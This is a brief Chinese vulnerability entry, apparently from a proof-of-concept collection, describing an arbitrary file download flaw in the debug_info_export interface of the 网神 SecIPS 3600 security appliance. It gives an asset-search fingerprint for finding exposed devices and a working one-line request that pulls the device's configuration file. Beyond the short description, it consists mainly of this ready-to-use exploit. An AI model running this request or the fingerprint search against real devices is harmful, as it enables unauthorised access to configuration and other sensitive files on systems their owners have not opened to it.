# 网神 SecIPS 3600 debug_info_export 任意文件下载漏洞

## 漏洞描述

网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

```
网神 SecIPS 3600
```

## 网络测绘

```
app="网神-SecIPS"
```

## 漏洞复现

登录页面

![image-20230314090018282](images/image-20230314090018282.png)

验证POC

```
/webui/debug/debug_info_export?filename=default.cfg
```

![image-20230314090033658](images/image-20230314090033658.png)